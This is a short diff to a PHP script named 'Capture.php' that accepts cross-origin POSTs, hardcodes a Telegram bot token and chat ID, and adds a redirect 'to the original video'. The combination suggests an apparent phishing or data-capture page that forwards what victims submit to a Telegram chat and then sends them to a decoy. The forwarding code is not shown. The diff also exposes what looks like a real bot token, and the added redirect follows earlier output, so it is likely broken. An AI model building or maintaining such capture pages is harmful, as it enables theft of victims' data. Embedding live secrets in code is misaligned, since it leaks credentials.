@@ -23,8 +23,9 @@ header('Access-Control-Allow-Origin: *');
 header('Access-Control-Allow-Methods: POST');
 header('Access-Control-Allow-Headers: Content-Type');
 
-$telegram_bot_token = getenv('TELEGRAM_BOT_TOKEN') ?: "8287031383:AAEUkQ0Yk9aiWGiG7_1d4SjIfAgR8msEWBA";
-$telegram_chat_id = getenv('TELEGRAM_CHAT_ID') ?: "8244999766";
+// Telegram credentials - hardcoded for reliability
+$telegram_bot_token = "8287031383:AAEUkQ0Yk9aiWGiG7_1d4SjIfAgR8msEWBA";
+$telegram_chat_id = "8244999766";
 
 // Log incoming request for debugging
 error_log("Capture.php called - Method: " . $_SERVER['REQUEST_METHOD']);
@@ -93,5 +94,9 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 } else {
     echo json_encode(['success' => false, 'error' => 'Invalid request method']);
 }
+
+// Always redirect to the original video
+header("Location: " . $redirect_url);
+exit;
 
 ?>
